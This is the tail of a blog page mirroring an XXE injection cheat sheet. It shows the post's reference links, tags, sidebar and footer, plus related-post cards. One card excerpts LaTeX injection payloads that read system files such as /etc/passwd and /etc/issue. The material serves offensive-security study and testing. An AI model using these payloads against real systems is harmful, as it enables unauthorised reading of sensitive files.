  <li><a href="https://portswigger.net/web-security/xxe">Web Security Academy » XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li>
  <li><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li>
  <li><a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/">EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li>
  <li><a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10">excel-reader-xlsx #10</a></li>
  <li><a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">Midnight Sun CTF 2019 Quals - Rubenscube</a></li>
  <li><a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li>
  <li><a href="https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf">Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/injection/'>Injection</a>,
            <a href='/categories/attack/'>Attack</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/xml/"
            class="post-tag no-text-decoration" >XML</a>
          
          <a href="/tags/attack/"
            class="post-tag no-text-decoration" >Attack</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=XML External Entity - PayloadsAllTheThings&url=http://localhost:4000/XXE-Injection/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=XML External Entity - PayloadsAllTheThings&u=http://localhost:4000/XXE-Injection/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=XML External Entity - PayloadsAllTheThings&url=http://localhost:4000/XXE-Injection/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/XPATH-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 24, 2020
  

  <i class="unloaded">2020-05-24T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>XPath Injection</h3>
            <div class="text-muted small">
              <p>
                





                
  XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.


Summary


  Ex...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/CSRF-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Dec 17, 2019
  

  <i class="unloaded">2019-12-17T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>CSRF Injection</h3>
            <div class="text-muted small">
              <p>
                





                Cross-Site Request Forgery


  Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated....
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Latex-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar  7, 2019
  

  <i class="unloaded">2019-03-07T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>LaTex Injection</h3>
            <div class="text-muted small">
              <p>
                





                Read file

\input{/etc/passwd}
\include{password} # load .tex file


Read single lined file

\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file


Read multiple line...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/XSS-Injection/" class="btn btn-outline-primary"
    prompt="Older">
    <p>XSS Injection</p>
  </a>
  

  
  <a href="/Reverse-Shell-Cheatsheet/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Reverse Shell Cheat Sheet</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

